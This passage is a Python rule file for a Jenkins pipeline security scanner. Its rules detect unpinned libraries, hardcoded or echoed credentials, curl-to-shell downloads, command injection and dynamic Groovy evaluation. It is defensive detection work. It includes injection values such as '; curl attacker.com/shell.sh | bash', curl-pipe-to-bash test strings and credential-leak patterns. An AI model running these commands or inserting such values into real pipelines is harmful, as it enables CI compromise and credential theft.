"""Jenkins pipeline security rules.

Covers Jenkinsfile (declarative and scripted) and Groovy pipeline files.
Rules map to the OWASP CI/CD Top 10 where applicable.

Jenkins pipelines have unique risk characteristics:
- Groovy is a full programming language — arbitrary code execution is trivial
- Shared libraries extend the attack surface across every pipeline that loads them
- `agent any` allows jobs to run on any connected node, including untrusted ones
- Credentials bound via withCredentials() are in-memory but echo/sh can leak them
- `params.*` values come directly from build triggers and may be attacker-controlled
"""

from taintly.models import (
    ContextPattern,
    Platform,
    RegexPattern,
    Rule,
    SequencePattern,
    Severity,
)

RULES: list[Rule] = [
    # =========================================================================
    # SEC3-JK-001: Shared library loaded without SHA pinning
    # =========================================================================
    Rule(
        id="SEC3-JK-001",
        title="Jenkins shared library loaded without commit-SHA pinning",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins shared library is loaded via @Library without pinning to a full "
            "40-character commit SHA. Without a SHA pin, Jenkins resolves the library "
            "each time it needs the code for a build — against a branch head or tag, "
            "both of which are mutable references (branches can be force-pushed, tags "
            "can be deleted and recreated). Only a 40-char commit SHA is immutable. "
            "Shared library code executes on the Jenkins controller with the same "
            "trust level as the Jenkinsfile itself, giving an attacker who controls "
            "the library repo arbitrary code execution on your CI infrastructure."
        ),
        pattern=RegexPattern(
            match=r"@Library\s*\(['\"][\w.-]+",
            exclude=[r"^\s*//", r"@[a-f0-9]{40}\b"],
        ),
        remediation=(
            "Pin shared libraries to a full commit SHA:\n"
            "  @Library('my-shared-lib@abc123def456abc123def456abc123def456abc1') _\n\n"
            "Find the current SHA:\n"
            "  git ls-remote https://github.com/org/my-shared-lib refs/heads/main\n\n"
            "Add a comment with the human-readable ref for maintainability:\n"
            "  @Library('my-shared-lib@abc123def456...') _ // v2.1.0"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/",
        test_positive=[
            "@Library('my-shared-lib') _",
            "@Library('my-shared-lib@main') _",
            "@Library('corp-lib@v1.2.3') _",
            "  @Library('utils@develop') _",
        ],
        test_negative=[
            "@Library('my-shared-lib@abc123def456abc123def456abc123def456abc1') _",
            "// @Library('my-shared-lib') _",
        ],
        stride=["T"],
        threat_narrative=(
            "A shared library loaded without a pinned commit SHA changes with every push to "
            "the library repository, meaning any contributor to that repository can "
            "silently modify what your pipeline executes on the next run. Shared libraries "
            "run as trusted code in the Jenkins Groovy sandbox with full access to the "
            "pipeline's credentials and workspace."
        ),
    ),
    # =========================================================================
    # SEC6-JK-001: Hardcoded credential in environment block
    # =========================================================================
    Rule(
        id="SEC6-JK-001",
        title="Hardcoded credential value in Jenkins environment block",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins environment block contains what appears to be a hardcoded credential "
            "value — a variable named with a credential-related keyword assigned a string "
            "literal of sufficient length to be a real secret. "
            "Hardcoded credentials in Jenkinsfiles are stored in version control in plain "
            "text, visible to everyone with repository read access. If the repository is "
            "ever made public or the VCS is compromised, the credential is immediately "
            "exposed. Use Jenkins Credentials Binding to store secrets in the Jenkins "
            "credential store instead."
        ),
        pattern=RegexPattern(
            match=(
                r"(?i)[A-Za-z0-9_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|API.?KEY|ACCESS.?KEY"
                r"|PRIVATE.?KEY|AUTH.?TOKEN|BEARER)[A-Za-z0-9_]*\s*=\s*['\"][a-zA-Z0-9+/=._\-]{8,}['\"]"
            ),
            exclude=[
                r"^\s*//",
                r"credentials\s*\(",
                r"credentialsId",
                r"usernamePassword\s*\(",
                r"withCredentials",
                r"\$\{",  # variable interpolation — not a hardcoded literal
            ],
        ),
        remediation=(
            "Store credentials in the Jenkins credential store and bind them at runtime:\n\n"
            "environment {\n"
            "    // Bind from Jenkins credential store — never hardcode\n"
            "    API_TOKEN = credentials('my-api-token-credential-id')\n"
            "}\n\n"
            "Or use withCredentials() for scoped binding:\n"
            "withCredentials([string(credentialsId: 'my-token', variable: 'API_TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $API_TOKEN\" ...'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "    GITHUB_TOKEN = 'ghp_abcdefghijklmnopqrst'",
            "    API_KEY = 'supersecretvalue123'",
            "    DOCKER_PASSWORD = 'mypassword123'",
            "    AUTH_TOKEN = 'Bearer_abc123xyz456'",
        ],
        test_negative=[
            "    API_TOKEN = credentials('my-api-token')",
            "    // GITHUB_TOKEN = 'ghp_placeholder'",
            '    TOKEN = "${env.INJECTED_TOKEN}"',
        ],
        stride=["I"],
        threat_narrative=(
            "Hardcoded credentials in the environment block are stored in the Jenkinsfile "
            "in version control, readable by anyone with repository access including "
            "contributors with read-only roles. Unlike Jenkins credentials store entries, "
            "hardcoded values cannot be rotated without a code change and are permanently "
            "visible in git history."
        ),
    ),
    # =========================================================================
    # SEC6-JK-002: Credential variable echoed inside withCredentials block
    # =========================================================================
    Rule(
        id="SEC6-JK-002",
        title="Credential variable echoed or printed inside withCredentials block",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline uses withCredentials() to bind a secret, but also "
            "contains an echo or shell command that references a credential-shaped "
            "variable — likely inside a double-quoted Groovy string. In Jenkins "
            "Pipeline, double-quoted Groovy strings (GStrings) are interpolated by "
            "Groovy BEFORE the step runs, so the literal secret value is embedded "
            "in the command string sent to the agent. Jenkins' SecretPatterns log "
            "filter is a best-effort matcher on the literal secret value; any "
            "encoding (base64/hex), splitting, or downstream transform in the shell "
            "defeats the matcher and the secret leaks to the log. "
            "The safest approach is to (a) use single-quoted Groovy strings so the "
            "shell — not Groovy — resolves the variable from the environment, and "
            "(b) never echo the credential variable at all.\n\n"
            "The variable-name regex below targets credential-shaped names "
            "(TOKEN, SECRET, PASSWORD/PASS, KEY, AUTH, CRED, BEARER, APIKEY, etc.) "
            "rather than firing on every echo of every shell variable inside a "
            "withCredentials block — the pre-audit pattern was field-test FP-prone "
            "on lines like `echo \"$illegal_filename\"` whose variable wasn't a "
            "secret at all."
        ),
        pattern=ContextPattern(
            # 2026-04-27 audit: anchor narrowed to credential-shaped
            # variable names. The previous pattern matched any echo of
            # any shell variable inside a file with withCredentials,
            # which produced FPs on benign lines (jenkins.io field
            # test caught `echo "$illegal_filename" >&2`). This list
            # is heuristic — custom credential variable names that
            # don't match these stems will FN, but in practice
            # Jenkins-bound secrets almost universally carry one of
            # these suffixes.
            anchor=(
                r"(?:echo\s+[\"']?\$\{?\w*"
                r"(?:TOKEN|SECRET|PASSWORD|PASS|KEY|AUTH|CRED|BEARER|APIKEY|PRIVATE_KEY|API_KEY)"
                r"\w*"
                r"|sh\s+[\"'].*echo\s+\$\{?\w*"
                r"(?:TOKEN|SECRET|PASSWORD|PASS|KEY|AUTH|CRED|BEARER|APIKEY|PRIVATE_KEY|API_KEY)"
                r"\w*)"
            ),
            requires=r"withCredentials\s*\(",
            exclude=[
                r"^\s*//",
                r"echo\s+.*\|",  # piped echo is command substitution, not log output
                r"=\s*`echo\b",  # backtick assignment: VAR=`echo $X | sed ...`
                r"=\s*\$\(echo\b",  # $() assignment: VAR=$(echo $X | sed ...)
            ],
            scope="job",
        ),
        remediation=(
            "Never echo credential variables, and keep the variable reference inside "
            "a single-quoted Groovy string so Groovy leaves it untouched and the "
            "shell expands it from the environment:\n"
            "\n"
            "// BAD — double-quoted Groovy string: Groovy interpolates the secret\n"
            "// value into the command string BEFORE Jenkins runs sh; log masking\n"
            "// becomes best-effort and fails under any encoding/splitting.\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            '    echo "Token: $TOKEN"\n'
            '    sh "echo $TOKEN"\n'
            "}\n"
            "\n"
            "// GOOD — single-quoted Groovy string; $TOKEN reaches the shell as a\n"
            "// literal name and the shell expands it from the withCredentials env.\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    echo \"$TOKEN\"\n}",
            "withCredentials([usernamePassword(credentialsId: 'creds', usernameVariable: 'USER', passwordVariable: 'PASS')]) {\n    sh 'echo $PASS'\n}",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n}",
            'echo "Build number: ${env.BUILD_NUMBER}"',
        ],
        stride=["I", "R"],
        threat_narrative=(
            "Referencing a credential variable inside a double-quoted Groovy string "
            "causes Groovy to interpolate the literal secret value into the command "
            "string before Jenkins runs the step. The SecretPatterns log matcher "
            "then tries to redact the literal value, but any encoding (base64, hex), "
            "splitting across two echoes, or downstream shell transform defeats the "
            "matcher and writes the secret into the console log — where it is "
            "readable by anyone with build log access and typically forwarded to "
            "long-lived log aggregation systems."
        ),
    ),
    # =========================================================================
    # SEC7-JK-001: Unconstrained agent (agent any)
    # =========================================================================
    Rule(
        id="SEC7-JK-001",
        title="Jenkins pipeline uses unconstrained 'agent any'",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "'agent any' allows Jenkins to schedule the pipeline on any available agent "
            "node in the build farm. In environments with mixed-trust build agents — "
            "for example, agents shared with other teams, cloud spot instances, or "
            "self-hosted community runners — this means sensitive builds can land on "
            "untrusted infrastructure with access to your workspace, environment "
            "variables, and any credentials bound during the build. "
            "Use labelled agents to constrain execution to known, trusted nodes."
        ),
        pattern=RegexPattern(
            match=r"^\s*agent\s+any\s*$",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Constrain the pipeline to a specific labelled agent or Docker container:\n\n"
            "// Use a labelled agent\n"
            "agent { label 'trusted-linux' }\n\n"
            "// Or use a pinned Docker image for full isolation\n"
            "agent {\n"
            "    docker {\n"
            "        image 'ubuntu@sha256:abc123...'\n"
            "        label 'docker-capable'\n"
            "    }\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#agent",
        test_positive=[
            "    agent any",
            "agent any",
            "  agent any  ",
        ],
        test_negative=[
            "    agent { label 'linux' }",
            "    agent { docker { image 'ubuntu:22.04' } }",
            "    // agent any",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "'agent any' allows the pipeline to run on any available Jenkins node including "
            "nodes with elevated cloud or infrastructure permissions, widening the scope of "
            "any compromise beyond what the pipeline actually requires. Pinning to a labelled "
            "agent restricts execution to nodes with the appropriate permission scope."
        ),
    ),
    # =========================================================================
    # SEC8-JK-001: Docker agent image uses :latest or no tag
    # =========================================================================
    Rule(
        id="SEC8-JK-001",
        title="Jenkins Docker agent or step uses mutable :latest or untagged image",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline specifies a Docker image for the build agent or a "
            "pipeline step using the ':latest' tag or no tag at all. "
            "The Docker image is the execution environment for the entire job — "
            "all build scripts, bound credentials, workspace contents, and environment "
            "variables execute inside this container. "
            "A mutable ':latest' tag resolves to whatever the registry points at when "
            "the build runs. If the upstream image is compromised or unexpectedly "
            "updated, all subsequent builds execute attacker-controlled code with "
            "access to every credential and secret in scope."
        ),
        pattern=RegexPattern(
            match=(
                r"^\s*image\s+['\"]"
                r"(?:[a-zA-Z0-9][^@'\"]*:latest|[a-zA-Z0-9][a-zA-Z0-9._\-/]+)"
                r"['\"]"
            ),
            exclude=[
                r"^\s*//",
                r"@sha256:",
                r":(?!latest)[a-zA-Z0-9]",  # has non-latest tag
            ],
        ),
        remediation=(
            "Pin Docker images to a SHA256 digest for a reproducible build environment. "
            "Keep the annotation OUTSIDE the string literal so the image argument is "
            "parsed correctly:\n"
            "\n"
            "agent {\n"
            "    docker {\n"
            "        // was 'ubuntu:latest' — pin to immutable digest\n"
            "        image 'ubuntu@sha256:abc123def456...'\n"
            "    }\n"
            "}\n"
            "\n"
            "Find the current digest:\n"
            "  docker pull ubuntu:latest && docker inspect ubuntu:latest | grep RepoDigests"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/docker/",
        test_positive=[
            "        image 'ubuntu:latest'",
            "        image 'node:latest'",
            "        image 'postgres'",
        ],
        test_negative=[
            "        image 'ubuntu:22.04'",
            "        image 'node:20-alpine'",
            "        image 'ubuntu@sha256:abc123def456'",
            "        // image 'ubuntu:latest'",
        ],
        stride=["T"],
        threat_narrative=(
            "A :latest or untagged Docker image used as a Jenkins agent or build container "
            "changes silently with every upstream push to the registry, replacing the "
            "execution environment for your pipeline without any change in the Jenkinsfile. "
            "A compromised image executes all pipeline steps with access to the workspace, "
            "credentials, and environment variables."
        ),
    ),
    # =========================================================================
    # SEC9-JK-001: curl or wget piped directly to shell
    # =========================================================================
    Rule(
        id="SEC9-JK-001",
        title="Jenkins pipeline downloads and executes content without integrity check",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline step uses curl or wget to download content and pipes it "
            "directly to a shell interpreter (bash, sh) without any integrity verification. "
            "This pattern executes whatever the remote server returns at build time — "
            "if the URL is compromised (DNS hijack, supply chain attack on the hosting "
            "server, or a malicious redirect), the attacker's code runs inside the build "
            "environment with access to all credentials, secrets, and build artefacts. "
            "Verify downloads with a SHA256 checksum before executing."
        ),
        pattern=RegexPattern(
            match=r'sh\s+[\'"\{]{1,3}[^\'"}]*(?:curl|wget)\s+\S[^\'"}]*\|\s*(?:ba)?sh',
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Download the script separately, verify its checksum, then execute:\n\n"
            "// BAD\n"
            "sh 'curl -fsSL https://get.example.com/install.sh | bash'\n\n"
            "// GOOD\n"
            "sh '''\n"
            "    curl -fsSL https://get.example.com/install.sh -o install.sh\n"
            "    echo 'abc123def456...  install.sh' | sha256sum --check\n"
            "    bash install.sh\n"
            "    rm install.sh\n"
            "'''"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation",
        test_positive=[
            "sh 'curl -fsSL https://get.helm.sh/install.sh | bash'",
            'sh "wget -qO- https://install.example.com | sh"',
            "sh 'curl https://example.com/setup.sh | bash -s'",
        ],
        test_negative=[
            "sh 'curl -fsSL https://example.com/file.sh -o file.sh'",
            "// sh 'curl https://example.com | bash'",
        ],
        stride=["T"],
        threat_narrative=(
            "Downloading and executing content without verifying its integrity allows a CDN "
            "compromise, DNS hijacking, or MITM attack to substitute a malicious payload "
            "for the expected installer or script. The pipeline executes "
            "attacker-controlled code with full access to the Jenkins agent environment and "
            "all bound credentials."
        ),
    ),
    # =========================================================================
    # SEC4-JK-001: User-controlled params interpolated in shell command
    # =========================================================================
    Rule(
        id="SEC4-JK-001",
        title="User-controlled build parameter interpolated in shell command",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline passes a user-supplied build parameter (params.*) "
            "directly into a shell command via string interpolation. "
            "Build parameters can be set by anyone who can trigger a build — "
            "including anonymous users if the Jenkins instance is misconfigured, "
            "or any authenticated user if parameters are exposed via the API. "
            "Unsanitized parameter values in shell commands allow command injection: "
            "a value like `; curl attacker.com/shell.sh | bash` runs as part of the "
            "build with access to all bound credentials and workspace contents."
        ),
        pattern=RegexPattern(
            # Only double-quoted Groovy strings (GStrings) interpolate
            # ${params.X} at Groovy parse time — single-quoted strings
            # leave the $-expression literal, so the shell sees no
            # attacker data. Match double-quote OR triple-double-quote
            # (Groovy `"""..."""` is also a GString and interpolates)
            # to avoid FPs on `sh 'echo ${params.X}'`.
            match=r'sh\s+"{1,3}.*\$\{?\s*params\s*\.',
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "The root cause is that double-quoted Groovy strings (GStrings) are "
            "interpolated by GROOVY before the `sh` step runs, so attacker-controlled "
            "metacharacters become part of the literal command string. The fix: "
            "put the value in an environment variable and write the `sh` body as a "
            "SINGLE-quoted (or triple-single-quoted) Groovy string so Groovy leaves "
            "`$BRANCH` alone and the SHELL expands it from the environment at "
            "runtime, which is safe because the shell never re-parses the expansion "
            'as code when it\'s the argument to `git checkout "$BRANCH"`.\n'
            "\n"
            "// BAD — double-quoted Groovy string: Groovy interpolates the attacker\n"
            "// value into the command string, so metacharacters execute as commands.\n"
            'sh "git checkout ${params.BRANCH_NAME}"\n'
            "\n"
            "// GOOD — single-quoted Groovy string + withEnv: Groovy leaves $BRANCH\n"
            "// alone; the shell expands it safely from the environment.\n"
            'withEnv(["BRANCH=${params.BRANCH_NAME}"]) {\n'
            "    sh '''\n"
            '        case "$BRANCH" in\n'
            '            *[!a-zA-Z0-9_/.-]*) echo "Invalid branch name"; exit 1 ;;\n'
            "        esac\n"
            '        git checkout "$BRANCH"\n'
            "    '''\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            'sh "git checkout ${params.BRANCH_NAME}"',
            'sh "docker build -t ${params.IMAGE_TAG} ."',
            'sh "./deploy.sh ${params.ENVIRONMENT}"',
        ],
        test_negative=[
            '// sh "git checkout ${params.BRANCH_NAME}"',
            "sh 'git checkout main'",
            "sh 'docker build -t ${params.IMAGE_TAG} .'",
            "def branch = params.BRANCH_NAME",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Build parameters are user-controlled strings that can contain shell "
            "metacharacters. When referenced inside a double-quoted Groovy string "
            "(GString) that becomes a shell command, Groovy performs the "
            "interpolation BEFORE the `sh` step runs — the attacker's metacharacters "
            "are baked into the literal command string that the shell then parses, "
            "bypassing any shell-level quoting. Exploitable by any user with job "
            "trigger access."
        ),
    ),
    # =========================================================================
    # SEC4-JK-002: SCM-controlled env variable interpolated in shell command
    # =========================================================================
    Rule(
        id="SEC4-JK-002",
        title="SCM-controlled environment variable interpolated in shell command",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline interpolates an SCM-sourced environment variable "
            "(GIT_BRANCH, BRANCH_NAME, CHANGE_BRANCH, CHANGE_TITLE, CHANGE_AUTHOR, "
            "or a ghprb* variable) directly inside a shell command string. "
            "These variables are populated from the triggering SCM event and may "
            "contain attacker-controlled content — for example, a branch name crafted "
            "to contain shell metacharacters (`; curl attacker.com | bash`). "
            "Unlike params.*, these values arrive automatically from webhooks without "
            "any explicit user input step, making them easy to overlook."
        ),
        pattern=RegexPattern(
            # Match double-quoted and triple-double-quoted Groovy
            # strings (both are GStrings and interpolate ${env.X});
            # single quotes suppress interpolation.
            match=(
                r'sh\s+"{1,3}.*\$\{?env\.'
                r"(?:GIT_BRANCH|BRANCH_NAME|CHANGE_BRANCH|CHANGE_TITLE"
                r"|CHANGE_AUTHOR|TAG_NAME|ghprb\w+)"
            ),
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Same pattern as SEC4-JK-001: Groovy double-quoted strings interpolate "
            "the attacker-controlled value into the command literal BEFORE `sh` "
            "runs. Pass the value through withEnv and write the shell body as a "
            "single- or triple-single-quoted Groovy string so Groovy leaves the "
            "variable alone and the shell expands it from the environment:\n"
            "\n"
            "// BAD — double-quoted Groovy string: Groovy interpolates the branch\n"
            "// name, attacker metacharacters become part of the command literal.\n"
            'sh "git checkout ${env.GIT_BRANCH}"\n'
            "\n"
            "// GOOD — triple-single-quoted body: Groovy leaves $BRANCH alone,\n"
            "// shell expands it safely from env.\n"
            'withEnv(["BRANCH=${env.GIT_BRANCH}"]) {\n'
            "    sh '''\n"
            '        case "$BRANCH" in\n'
            '            *[!a-zA-Z0-9_/.-]*) echo "Suspicious branch name"; exit 1 ;;\n'
            "        esac\n"
            '        git checkout "$BRANCH"\n'
            "    '''\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#string-interpolation",
        test_positive=[
            'sh "git checkout ${env.GIT_BRANCH}"',
            'sh "docker build -t myapp:${env.BRANCH_NAME} ."',
            "sh \"./notify.sh '${env.CHANGE_AUTHOR}'\"",
        ],
        test_negative=[
            'sh "echo Build number: ${env.BUILD_NUMBER}"',
            "sh 'git checkout main'",
            '// sh "git checkout ${env.GIT_BRANCH}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "SCM-provided environment variables like GIT_BRANCH, GIT_COMMIT, and "
            "CHANGE_TITLE are populated from attacker-controlled git data — branch names "
            "and commit messages can contain shell metacharacters. When these values are "
            "interpolated via Groovy GString syntax into shell commands, a contributor who "
            "can push a crafted branch name achieves command injection."
        ),
    ),
    # =========================================================================
    # SEC4-JK-003: Dynamic Groovy evaluation
    # =========================================================================
    Rule(
        id="SEC4-JK-003",
        title="Dynamic Groovy code evaluation via evaluate() or Eval",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline uses Groovy's `evaluate()`, `Eval.me()`, `Eval.x()`, "
            "or `Eval.xy()` to execute dynamically-constructed code strings. "
            "These functions execute arbitrary Groovy code with the same privileges "
            "as the pipeline itself — typically with access to the Jenkins controller, "
            "all credentials, and the filesystem. "
            "If any part of the evaluated string originates from user input, build "
            "parameters, SCM content, or a network response, this is a direct code "
            "injection vulnerability. Even without user input, dynamic evaluation "
            "makes pipelines hard to audit and bypasses Jenkins script approval."
        ),
        pattern=RegexPattern(
            match=r"\b(?:evaluate|Eval\.(?:me|x|xy))\s*\(",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Replace dynamic evaluation with explicit conditional logic or "
            "pre-approved shared library functions:\n\n"
            "// BAD\n"
            'evaluate("deploy${env.ENV_NAME}()")\n\n'
            "// GOOD — explicit dispatch\n"
            "if (env.ENV_NAME == 'prod') { deployProd() }\n"
            "else if (env.ENV_NAME == 'staging') { deployStaging() }\n\n"
            "If evaluate() is unavoidable, ensure the input is a hard-coded string "
            "that never incorporates user-controlled data."
        ),
        reference="https://www.jenkins.io/doc/book/managing/script-approval/",
        test_positive=[
            'evaluate("deploy${env.TARGET}()")',
            "Eval.me('System.exit(1)')",
            "def result = Eval.x(value, 'x * 2')",
        ],
        test_negative=[
            "// evaluate('something')",
            "def x = evaluateScore(result)",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "evaluate() executes arbitrary Groovy code at runtime, completely bypassing the "
            "Jenkins script security sandbox and all method approval restrictions. An "
            "attacker who can influence the evaluated string — through a compromised shared "
            "library, a malicious parameter, or an injected environment variable — gains "
            "unconstrained code execution on the Jenkins controller."
        ),
    ),
    # =========================================================================
    # SEC6-JK-003: println leaks credential inside withCredentials block
    # =========================================================================
    Rule(
        id="SEC6-JK-003",
        title="println may expose credential variable inside withCredentials block",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline uses `println` to log a variable inside a "
            "`withCredentials()` block. `println` writes directly to the build log — "
            "unlike `sh 'echo'`, Groovy's println can bypass Jenkins credential "
            "masking in some configurations and plugin versions. "
            "Even when masking works, logging credential variables establishes a "
            "habit that is easy to exploit through encoding tricks (e.g. printing "
            "the base64-encoded value)."
        ),
        pattern=ContextPattern(
            # Bare variable refs (println P) and interpolated ($P / ${P}) both leak
            anchor=r"\bprintln\b.*(?:\$\{?\w+|\b[A-Z_]{2,}\b)",
            requires=r"withCredentials\s*\(",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Never log credential variables. Remove println statements that reference "
            "bound credential variables:\n\n"
            "// BAD\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            '    println "Using token: ${TOKEN}"   // may bypass masking\n'
            "}\n\n"
            "// GOOD — log intent, not value\n"
            "withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {\n"
            "    println 'Authenticating with stored credential'\n"
            "    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    println \"${TOKEN}\"\n}",
            "withCredentials([usernamePassword(credentialsId: 'c', usernameVariable: 'USER', passwordVariable: 'PASS')]) {\n    println PASS\n}",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'id', variable: 'TOKEN')]) {\n    println 'Authenticating'\n}",
            'println "Build: ${env.BUILD_NUMBER}"',
        ],
        stride=["I", "R"],
        threat_narrative=(
            "println inside a withCredentials block may print the secret value to the "
            "Jenkins console log via Groovy's implicit string representation of objects "
            "that contain the credential. Even if masking catches the literal value, "
            "derived representations or concatenated strings containing the credential may "
            "appear unmasked."
        ),
    ),
    # =========================================================================
    # SEC8-JK-002: Remote Groovy script loaded and executed via URL
    # =========================================================================
    Rule(
        id="SEC8-JK-002",
        title="Remote Groovy script fetched from URL and executed",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline fetches a Groovy script from a remote URL using "
            "`new URL('...').text` and then executes or evaluates it. "
            "This is effectively a `curl | bash` for Groovy — the remote server "
            "controls what code runs on the Jenkins controller with full pipeline "
            "privileges, including access to all credentials, the Jenkins API, "
            "and the underlying host if the controller is not sandboxed. "
            "Unlike shared libraries, URL-fetched scripts bypass the Jenkins "
            "script approval mechanism entirely."
        ),
        pattern=RegexPattern(
            match=r"new\s+URL\s*\(['\"]https?://[^)]+\)\.text",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Replace URL-fetched scripts with Jenkins Shared Libraries:\n\n"
            "// BAD\n"
            "def script = new URL('https://raw.githubusercontent.com/org/repo/main/script.groovy').text\n"
            "evaluate(script)\n\n"
            "// GOOD — use a pinned shared library instead\n"
            "@Library('my-shared-lib@abc123sha') _\n"
            "import org.example.MyHelper\n"
            "MyHelper.doThing()\n\n"
            "Shared libraries are version-controlled, reviewed, and approved "
            "through the Jenkins script approval mechanism."
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/shared-libraries/",
        test_positive=[
            "def s = new URL('https://raw.githubusercontent.com/org/repo/main/s.groovy').text",
            "evaluate(new URL('https://example.com/script.groovy').text)",
        ],
        test_negative=[
            "// def s = new URL('https://example.com/s.groovy').text",
            "def url = new URL('https://api.example.com/data')",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Fetching and executing a Groovy script from a remote URL is equivalent to "
            "granting the hosting server arbitrary code execution on the Jenkins controller "
            "— Groovy scripts loaded this way bypass the script security sandbox entirely. "
            "DNS hijacking or server compromise is sufficient to substitute a malicious "
            "payload that runs with full Jenkins controller privileges."
        ),
    ),
    # =========================================================================
    # SEC3-JK-002: @Grab annotation without explicit version
    # =========================================================================
    Rule(
        id="SEC3-JK-002",
        title="@Grab annotation pulls dependency without explicit version",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins pipeline or shared library uses a `@Grab` annotation to pull "
            "a Groovy/Java dependency without specifying an explicit version. "
            "Unversioned `@Grab` annotations resolve to the latest available version "
            "at execution time — any new release of the dependency (including a "
            "compromised one) is automatically picked up on the next pipeline run. "
            "Dependencies fetched via @Grab are not subject to the same review as "
            "Jenkins plugins and execute directly in the Groovy runtime."
        ),
        pattern=RegexPattern(
            match=r"@Grab\s*\(",
            exclude=[
                r"^\s*//",
                # Shorthand with version: group:artifact:version (two colons)
                r"@Grab\s*\(\s*['\"][^'\"]+:[^'\"]+:[^'\"]+['\"]",
                # Named-parameter form with explicit version
                r"version\s*[=:]\s*['\"][^'\"]+['\"]",
            ],
        ),
        remediation=(
            "Always specify an explicit version in @Grab annotations:\n\n"
            "// BAD — resolves to latest at runtime\n"
            "@Grab('org.apache.commons:commons-lang3')\n\n"
            "// GOOD — pinned version\n"
            "@Grab('org.apache.commons:commons-lang3:3.12.0')\n\n"
            "Better still: declare dependencies in a build tool (Maven/Gradle) "
            "with a lockfile checked into the repository, and load them via "
            "a shared library rather than @Grab."
        ),
        reference="https://groovy-lang.org/grape.html",
        test_positive=[
            "@Grab('org.apache.commons:commons-lang3')",
            "@Grab(group='log4j', module='log4j')",
        ],
        test_negative=[
            "@Grab('org.apache.commons:commons-lang3:3.12.0')",
            "// @Grab('org.some:library')",
        ],
        stride=["T"],
        threat_narrative=(
            "@Grab without a pinned version resolves the dependency from the remote "
            "repository on each run, allowing a malicious or compromised Groovy artifact to "
            "be substituted transparently. Grabbed dependencies run as trusted Groovy code "
            "with access to the full Jenkins pipeline context including credentials."
        ),
    ),
    # =========================================================================
    # SEC1-JK-001: Production deployment without manual approval gate
    # =========================================================================
    Rule(
        id="SEC1-JK-001",
        title="Production deployment stage has no manual approval gate",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A Jenkins pipeline stage that appears to deploy to production "
            "(name contains 'prod', 'production', 'live', or 'release') does not "
            "contain an `input` step requiring manual approval before execution. "
            "Without an approval gate, any automated trigger — including a webhook "
            "from an attacker who has pushed a malicious commit or compromised a "
            "dependency — can promote code directly to production. "
            "Manual approval gates break the chain of fully automated privilege "
            "escalation from code push to production deployment."
        ),
        pattern=SequencePattern(
            pattern_a=(
                r"stage\s*\(['\"]"
                r"(?:[Dd]eploy|[Pp]ublish|[Rr]elease|[Pp]ush)[^'\"]*"
